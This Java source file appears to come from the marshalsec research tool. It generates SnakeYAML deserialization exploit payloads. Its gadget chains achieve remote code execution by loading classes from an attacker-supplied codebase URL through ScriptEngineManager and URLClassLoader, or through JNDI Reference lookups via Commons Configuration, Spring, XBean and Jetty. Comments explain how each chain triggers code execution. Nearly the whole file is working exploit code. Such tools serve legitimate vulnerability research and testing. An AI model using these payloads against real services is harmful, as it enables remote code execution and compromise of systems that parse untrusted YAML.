/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.net.URL;
import java.net.URLClassLoader;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;
import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.script.ScriptEngineManager;

import org.apache.commons.configuration.ConfigurationMap;
import org.apache.commons.configuration.JNDIConfiguration;
import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
import org.apache.xbean.naming.context.WritableContext;
import org.eclipse.jetty.plus.jndi.Resource;
import org.springframework.beans.factory.config.PropertyPathFactoryBean;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import org.yaml.snakeyaml.Yaml;

import marshalsec.gadgets.Args;
import marshalsec.gadgets.C3P0RefDataSource;
import marshalsec.gadgets.C3P0WrapperConnPool;
import marshalsec.gadgets.CommonsConfiguration;
import marshalsec.gadgets.JdbcRowSet;
import marshalsec.gadgets.ResourceGadget;
import marshalsec.gadgets.ScriptEngine;
import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
import marshalsec.gadgets.SpringPropertyPathFactory;
import marshalsec.gadgets.XBean;


/**
 * 
 * Not applicable:
 * - ROME: cannot construct java.lang.Class instance
 * - ImageIO: cannot construct Method instance, can however still be used to trigger an iterator
 * 
 * - LazySearchEnumeration: may be possible
 * 
 * @author mbechler
 *
 */
public class SnakeYAML extends YAMLBase implements ScriptEngine, JdbcRowSet, CommonsConfiguration, C3P0RefDataSource, C3P0WrapperConnPool,
        SpringPropertyPathFactory, SpringAbstractBeanFactoryPointcutAdvisor, XBean, ResourceGadget {

    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
     */
    @Override
    public String marshal ( Object o ) throws Exception {
        Yaml r = new Yaml();
        return r.dump(o);
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
     */
    @Override
    public Object unmarshal ( String data ) throws Exception {
        Yaml r = new Yaml();
        return r.load(data);
    }


    @Override
    @Args ( minArgs = 1, args = {
        "codebase"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase
    } )
    public Object makeScriptEngine ( UtilFactory uf, String[] args ) throws Exception {
        return writeConstructor(
            ScriptEngineManager.class,
            true,
            writeConstructor(URLClassLoader.class, true, writeArray(writeConstructor(URL.class, true, writeString(args[ 0 ])))));
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.gadgets.CommonsConfiguration#makeConfigurationMap(marshalsec.UtilFactory, java.lang.String[])
     */
    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeConfigurationMap ( UtilFactory uf, String[] args ) throws Exception {
        return writeSet(
            writeObject(
                ConfigurationMap.class,
                Collections.EMPTY_MAP,
                1,
                writeConstructor(JNDIConfiguration.class, true, writeConstructor(InitialContext.class, true), writeString(args[ 0 ]))));
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.gadgets.SpringPropertyPathFactory#makePropertyPathFactory(marshalsec.UtilFactory,
     *      java.lang.String[])
     */
    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makePropertyPathFactory ( UtilFactory uf, String[] args ) throws Exception {
        Map<String, String> properties = new LinkedHashMap<>();
        String jndiUrl = args[ 0 ];
        properties.put("targetBeanName", writeString(jndiUrl));
        properties.put("propertyPath", "foo");
        properties.put(
            "beanFactory",
            writeObject(SimpleJndiBeanFactory.class, Collections.singletonMap("shareableResources", writeArray(writeString(jndiUrl))), 1));
        return writeObject(PropertyPathFactoryBean.class, properties);
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.gadgets.XBean#makeXBean(marshalsec.UtilFactory, java.lang.String[])
     */
    @Override
    @Args ( minArgs = 2, args = {
        "codebase", "classname"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    public Object makeXBean ( UtilFactory uf, String[] args ) throws Exception {
        // BadAttributeValueExpException constructor as toString trigger
        return writeConstructor(
            BadAttributeValueExpException.class,
            false,
            writeConstructor(
                ReadOnlyBinding.class,
                true,
                writeString("foo"),
                writeConstructor(Reference.class, true, "foo", writeString(args[ 1 ]), writeString(args[ 0 ])),
                writeConstructor(WritableContext.class, true)));
    }


    @Override
    @Args ( minArgs = 2, args = {
        "codebase", "classname"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    public Object makeResource ( UtilFactory uf, String[] args ) throws Exception {
        return writeArray(
            // bind to __/obj, this is actually the location where the NamingEntry for 'obj' would be stored
            // (which now is stored at __/__/obj)
            writeConstructor(
                Resource.class,
                true,
                writeString("__/obj"),
                // usual reference setup
                writeConstructor(Reference.class, true, writeString("foo"), writeString(args[ 1 ]), writeString(args[ 0 ]))),

            // rebind compound name subresource
            // this first tries to rebind the NamingEntry at the compound name __/obj/test
            // the lookup of the intermediate context __/obj yields the Reference bound before
            // --> code execution through JNDI factory loading
            writeConstructor(Resource.class, true, writeString("obj/test"), writeConstructor(Object.class, true)));
    }


    @Override
    protected boolean constructorArgumentsSupported () {
        return true;
    }


    @Override
    protected String constructorPrefix ( boolean inline ) {
        return "!!";
    }


    public static void main ( String[] args ) {
        new SnakeYAML().run(args);
    }

}
